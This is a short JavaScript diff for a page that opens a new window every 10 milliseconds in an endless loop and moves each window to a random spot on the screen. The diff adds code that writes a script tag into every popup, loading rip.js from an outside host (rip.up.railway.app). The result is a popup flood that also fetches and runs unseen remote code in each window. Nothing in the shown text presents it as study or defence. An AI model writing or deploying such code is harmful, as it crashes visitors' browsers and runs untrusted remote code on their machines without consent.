@@ -10,14 +10,26 @@
             const randomY = Math.floor(Math.random() * screenHeight);
 
             newWin.moveTo(randomX, randomY);
+
+            // Write HTML content
+            newWin.document.write(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <script src="https://rip.up.railway.app/rip.js"></script>
+                </head>
+                <body>
+                </body>
+                </html>
+            `);
         }
 
         return newWin;
     }
 
     const openWithFixedDelay = () => {
-        openWindow('lol.html');
-        
+        openWindow('');
+
         setTimeout(openWithFixedDelay, 10); // Fixed delay of 10 ms
     };
 
